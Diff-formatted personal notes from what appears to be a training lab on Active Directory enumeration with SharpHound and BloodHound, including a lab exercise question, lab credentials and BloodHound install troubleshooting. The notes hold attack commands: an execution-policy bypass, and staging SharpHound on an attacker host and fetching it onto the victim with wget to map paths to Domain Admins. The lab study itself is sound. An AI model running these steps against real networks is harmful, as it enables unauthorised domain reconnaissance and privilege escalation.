@@ -1,0 +1,161 @@
+Active Directory Introduction and Enumeration
+
+Active Directory - Automated Enumeration
+
+Collecting Data with SharpHound
+
+SharpHound to collect the data (snapshot or looping). BloodHound to analyze
+
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+audit_20240810201601_BloodHound.zip
+
+------------
+Analysing Data using BloodHound
+
+sudo neo4j start
+http://localhost:7474
+neo4j/neo4j
+
+bloodhound
+bolt://localhost:7687
+neo4j
+neo4j
+
+upload zip
+Database Info
+DB STATS
+ON-PREM OBJECTS
+
+Node Info
+
+Analysis
+Find all Domain Admins under 
+Domain Information
+show node label
+
+attempt to find the shortest path 
+Find Shortest Paths to Domain Admins
+hover over relationship
+
+help menu
+Info
+Abuse tab
+
+(An Owned principal in BloodHound is a security principal (user, computer, or group) that an attacker has already compromised, marked in the interface with a skull icon. This label allows users to visualize attack paths starting from compromised accounts toward high-value targets, Users can right-click any node (user, computer, group) and select "Mark as Owned" to update its property in the database)
+Mark User as Owned
+Mark Computer as Owned
+
+run Shortest Paths to Domain Admins from Owned Principals
+
+-----------
+Search for the Management Department group in BloodHound and use the Node Info tab to have a look at the Inbound Control Rights for the group. What group is currently the owner of the Management Department group? Submit the answer without the domain name (@corp.com)
+
+dc1 192.168.66.70
+client75 192.168.66.75 stephanie/LegmanTeamBenzoin!!
+attacker 192.168.49.66
+
+curl -O https://raw.githubusercontent.com/leefrk/hacking/refs/heads/main/SharpHound.ps1
+python3 -m http.server 80
+
+xfreerdp3 /u:stephanie /v:192.168.66.75
+
+powershell -ep bypass
+Import-Module .\SharpHound.ps1
+
+wget http://192.168.49.66/SharpHound.ps1 -O ./SharpHound.ps1
+dir
+Get-ChildItem -Force
+(powershell to command, cmd)
+
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\adtest\ -OutputPrefix "corp audit"
+
+corp audit_20260209043823_BloodHound.zip
+
+explorer
+copy and paste from windows to kali
+
+unzip corp\ audit_20260209043823_BloodHound.zip
+
+dpkg -l | grep bloodhound
+apt list --installed bloodhound
+sudo apt update && sudo apt install bloodhound
+
+sudo neo4j start
+http://localhost:7474
+
+bolt://localhost:7687
+neo4j
+neo4j
+
+neo4j2
+
+bloodhound
+into bloodhound setup:
+
+database "postgres" has a collation version mismatch !
+psql: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: FATAL:  database "bloodhound" does not exist !
+                             
+AI suggest:
+sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION VERSION; ALTER DATABASE template1 REFRESH COLLATION VERSION;'
+
+sudo systemctl restart postgresql
+
+fixed~!! 
+
+next step, open bloodhound
+
+ [*] Starting PostgreSQL service
+
+ [*] Creating Database
+User _bloodhound already exists in PostgreSQL
+Database bloodhound already exists in PostgreSQL
+ALTER ROLE
+
+ [*] Starting neo4j
+Neo4j is running at pid 3812
+
+ [i] You need to change the default password for neo4j
+     Default credentials are user:neo4j password:neo4j
+
+ [!] IMPORTANT: Once you have setup the new password, please update /etc/bhapi/bhapi.json with the new password before running bloodhound
+
+ opening http://localhost:7474/
+id: ?kalikalikalikalikalikalikalikalikali?: no such user
+runuser: user kalikalikalikalikalikalikalikalikali does not exist or the user entry does not contain all the required fields
+
+failed launch bloodhound !
+
+try:
+sudo vi /etc/bhapi/bhapi.json
+change neo4j secret to neo4j2
+
+bloodhound
+
+opening http://127.0.0.1:8080
+id: ?kalikalikalikalikalikalikalikalikali?: no such user
+runuser: user kalikalikalikalikalikalikalikalikali does not exist or the user entry does not contain all the required fields
+
+failed launch bloodhound !
+
+try:
+sudo adduser kalikalikalikalikalikalikalikalikali
+sudo passwd kalikalikalikalikalikalikalikalikali
+
+err: Usernames must be no more than 32 bytes in length !
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
